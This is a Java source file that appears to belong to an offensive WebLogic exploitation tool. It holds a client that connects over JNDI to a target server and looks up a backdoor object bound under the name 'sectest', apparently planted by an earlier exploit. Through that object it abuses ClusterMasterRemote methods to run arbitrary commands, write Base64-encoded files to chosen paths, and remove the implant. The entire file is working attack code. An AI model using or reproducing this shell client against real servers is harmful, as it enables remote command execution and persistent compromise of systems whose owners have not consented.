package superman.core;

import sun.misc.BASE64Encoder;
import weblogic.cluster.singleton.ClusterMasterRemote;
import weblogic.iiop.IOPProfile;

import javax.naming.Context;
import javax.naming.InitialContext;
import java.util.Hashtable;

public class JNDIShellClient {

    private static InitialContext getInitContext(String protocol, String host, int port){
        try{
            String url = String.format("%s://%s:%s", protocol, host, port);
            Hashtable env = new Hashtable();
            env.put(Context.INITIAL_CONTEXT_FACTORY, "weblogic.jndi.WLInitialContextFactory");
            env.put(Context.PROVIDER_URL, url);
            env.put("weblogic.jndi.requestTimeout", Store.TIME_OUT);
            if (protocol.equals("iiop")) {
                IOPProfile.IP = host;
                IOPProfile.PORT = port;
                env.put("weblogic.jndi.requestTimeout", Store.TIME_OUT + "");
            }
            InitialContext initialContext = new InitialContext(env);
            return initialContext;
        }catch (Exception e){
            e.printStackTrace();
        }
        return null;
    }

    public static String exec(String protocol,String host,int port,String cmd) {
        try {
            Object obj= getInitContext(protocol,host,port).lookup("sectest");;
            if(obj instanceof ClusterMasterRemote) {
                ClusterMasterRemote shell = (ClusterMasterRemote)obj;
                String result = null;
                if (shell != null) {
                    result = shell.getServerLocation(cmd);
                    if(result!=null){
                        result=result.trim();
                    }
                }
                return result;
            }
        } catch (Exception e) {
            e.printStackTrace();
        }catch (Error e) {
            e.printStackTrace();
        }
        return null;
    }

    public static void upload(String protocol, String host, int port, String path, String text) {
        try {
            Object obj= getInitContext(protocol,host,port).lookup("sectest");;
            if(obj instanceof ClusterMasterRemote) {
                ClusterMasterRemote shell = (ClusterMasterRemote)obj;
                if (shell != null) {
                    shell.setServerLocation(path, new BASE64Encoder().encode(text.getBytes()));
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }catch (Error e) {
            e.printStackTrace();
        }
    }
    public static void remove(String protocol, String host, int port) {
        exec(protocol,host,port,"unbind");
        /*try {
            getInitContext(protocol,host,port).unbind("test");
        } catch (NamingException e) {
            e.printStackTrace();
        }*/
    }
}
